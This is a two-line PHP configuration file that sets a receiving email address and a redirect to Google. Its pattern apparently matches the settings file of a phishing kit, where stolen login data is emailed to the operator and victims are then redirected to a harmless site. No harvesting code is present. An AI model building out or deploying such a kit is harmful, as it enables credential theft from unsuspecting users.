<?php 
$Receive_email="lfraley692@gmail.com";
$redirect="https://www.google.com/";
?>